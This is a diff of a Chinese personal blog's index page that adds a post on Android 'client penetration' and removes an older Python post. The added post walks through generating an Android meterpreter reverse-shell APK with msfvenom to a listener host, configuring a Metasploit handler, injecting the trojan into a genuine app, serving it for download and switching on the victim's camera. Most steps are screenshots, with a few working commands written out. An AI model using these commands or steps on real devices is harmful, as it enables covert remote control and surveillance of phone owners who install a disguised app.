@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">32</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">33</span></a>
 
   </li>
   </ul>
@@ -581,6 +581,145 @@
 <p><strong>数据溢出解决方法：</strong>c=a*b;if b=c/a,ture</p>
 <p>注意：即使数据没溢出，但是如果操作数之间的精度不够，可能会出现精度丢失，造成的结果也不对。但是如果都整数类型，且是先进行乘法后用除法验证，就可以准确判断溢出问题。</p>
 <p><strong>加密货币的应用场景：</strong>已有的支付方式没有较好解决的领域</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">安卓客户端渗透</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-18 18:29:35 / 修改时间：18:32:40" itemprop="dateCreated datePublished" datetime="2021-08-18T18:29:35+08:00">2021-08-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="安卓客户端渗透"><a href="#安卓客户端渗透" class="headerlink" title="安卓客户端渗透"></a>安卓客户端渗透</h1><h2 id="一、后门程序渗透安卓"><a href="#一、后门程序渗透安卓" class="headerlink" title="一、后门程序渗透安卓"></a>一、后门程序渗透安卓</h2><p>步骤1：使用MSF生成一个apk的后门应用程序</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162007668.png" alt="image-20210818162007668"></p>
+<p>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 R &gt;xuegod.apk</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162243078.png" alt="image-20210818162243078"></p>
+<p>步骤2：监听</p>
+<p>启动msf</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162413014.png" alt="image-20210818162413014"></p>
+<p>加载渗透模块并配置参数</p>
+<p>use exploit/multi/handler</p>
+<p>set payload android/meterpreter/reverse_tcp</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162558054.png" alt="image-20210818162558054"></p>
+<p>步骤3：</p>
+<p>手机端下载并打开程序</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162318121.png" alt="image-20210818162318121"></p>
+<p>kali端，会话建立成功</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162707785.png" alt="image-20210818162707785"></p>
+<p>操控命令说明补充：</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162741892.png" alt="image-20210818162741892"></p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162808076.png" alt="image-20210818162808076"></p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162903481.png" alt="image-20210818162903481"></p>
+<p>二、将木马隐藏到正版app中<br>说明：请勿在Kali2019.4版本中操作，可能存在兼容问题</p>
+<p><strong>步骤1：搭建环境</strong></p>
+<p>禁用ipv6</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163134441.png" alt="image-20210818163134441"></p>
+<p>下载工具</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163211629.png" alt="image-20210818163211629"></p>
+<p>解压文件</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163316767.png" alt="image-20210818163316767"></p>
+<p>解压结果</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163357630.png" alt="image-20210818163357630"></p>
+<p>修改程序</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163458535.png" alt="image-20210818163458535"></p>
+<p><strong>步骤2：</strong>注入后门到apk</p>
+<p>载入要注入后门的apk和apktool.jar工具到kali（注意路径）</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818163928062.png" alt="image-20210818163928062"></p>
+<p>进入apk工具（这里用到逆向与注入）</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164112162.png" alt="image-20210818164112162"></p>
+<p>选择第3项（输入3)，然后配置参数</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164734783.png" alt="image-20210818164734783"></p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164643208.png" alt="image-20210818164643208"></p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164805027.png" alt="image-20210818164805027"></p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164849132.png" alt="image-20210818164849132"></p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165009619.png" alt="image-20210818165009619"></p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165125523.png" alt="image-20210818165125523"></p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170027865.png" alt="image-20210818170027865"></p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170140902.png" alt="image-20210818170140902"></p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170211040.png" alt="image-20210818170211040"></p>
+<p>补充：</p>
+<p>出错情况1：</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164416940.png" alt="image-20210818164416940"></p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818164435145.png" alt="image-20210818164435145"></p>
+<p>出错情况2：</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165254757.png" alt="image-20210818165254757"></p>
+<p>解决方法</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165616957.png" alt="image-20210818165616957"></p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818165818720.png" alt="image-20210818165818720"></p>
+<p>步骤3：手动启动msf的监听（该步骤非必须，也可以用它自带的，如步骤2结果）</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162413014.png" alt="image-20210818162413014"></p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818162558054.png" alt="image-20210818162558054"></p>
+<p>步骤4：启动apache2服务</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170535594.png" alt="image-20210818170535594"></p>
+<p>把apk放到根目录方便下载</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170632278.png" alt="image-20210818170632278"></p>
+<p>步骤5：安卓手机下载并安装apk</p>
+<p>安装过程略，启动运行软件后</p>
+<p>直接上结果</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170902403.png" alt="image-20210818170902403"></p>
+<p>补充：</p>
+<p>启动摄像头</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818170957413.png" alt="image-20210818170957413"></p>
+<p>注意：手机端会提示是是否打开摄像头</p>
+<p><img src="/2021/08/18/%E5%AE%89%E5%8D%93%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210818171041850.png" alt="image-20210818171041850"></p>
 
       
     </div>
@@ -1685,85 +1824,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/07/29/%E8%A7%84%E8%8C%83%E4%B9%A0%E6%83%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="北极星上的稻草人">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="北极星上的稻草人">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/07/29/%E8%A7%84%E8%8C%83%E4%B9%A0%E6%83%AF/" class="post-title-link" itemprop="url">python规范习惯</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-07-29 09:16:48 / 修改时间：09:21:08" itemprop="dateCreated datePublished" datetime="2021-07-29T09:16:48+08:00">2021-07-29</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/python%E5%85%A5%E9%97%A8/" itemprop="url" rel="index"><span itemprop="name">python入门</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="规范习惯"><a href="#规范习惯" class="headerlink" title="规范习惯"></a>规范习惯</h2><h3 id="1、编码规范"><a href="#1、编码规范" class="headerlink" title="1、编码规范"></a>1、编码规范</h3><p><img src="/2021/07/29/%E8%A7%84%E8%8C%83%E4%B9%A0%E6%83%AF/image-20210710181733893.png" alt="image-20210710181733893"></p>
-<p>例如</p>
-<p><img src="/2021/07/29/%E8%A7%84%E8%8C%83%E4%B9%A0%E6%83%AF/image-20210710181910978.png" alt="image-20210710181910978"></p>
-<h3 id="2、引入模块（导包）"><a href="#2、引入模块（导包）" class="headerlink" title="2、引入模块（导包）"></a>2、引入模块（导包）</h3><p><img src="/2021/07/29/%E8%A7%84%E8%8C%83%E4%B9%A0%E6%83%AF/image-20210710181950296.png" alt="image-20210710181950296"></p>
-<h4 id="2-1-引入自定义模块（包）"><a href="#2-1-引入自定义模块（包）" class="headerlink" title="2.1 引入自定义模块（包）"></a>2.1 引入自定义模块（包）</h4><p>​    方法：from 目录  import 文件名</p>
-<p><img src="/2021/07/29/%E8%A7%84%E8%8C%83%E4%B9%A0%E6%83%AF/image-20210710182437380.png" alt="image-20210710182437380"></p>
-<h4 id="2-2-引入系统的模块"><a href="#2-2-引入系统的模块" class="headerlink" title="2.2 引入系统的模块"></a>2.2 引入系统的模块</h4><p>​    方法：import 文件名</p>
-<p>​    例如：import sys，import os</p>
-<h4 id="2-3-引入第三方模块"><a href="#2-3-引入第三方模块" class="headerlink" title="2.3 引入第三方模块"></a>2.3 引入第三方模块</h4><p>方法：import 文件名</p>
-<p>注意：文件需要自己导入项目（如下）</p>
-<p><img src="/2021/07/29/%E8%A7%84%E8%8C%83%E4%B9%A0%E6%83%AF/image-20210710182815440.png" alt="image-20210710182815440"></p>
-<h3 id="3获取数据"><a href="#3获取数据" class="headerlink" title="3获取数据"></a>3获取数据</h3><p><img src="/2021/07/29/%E8%A7%84%E8%8C%83%E4%B9%A0%E6%83%AF/image-20210711093930342.png" alt="image-20210711093930342"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1833,7 +1893,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
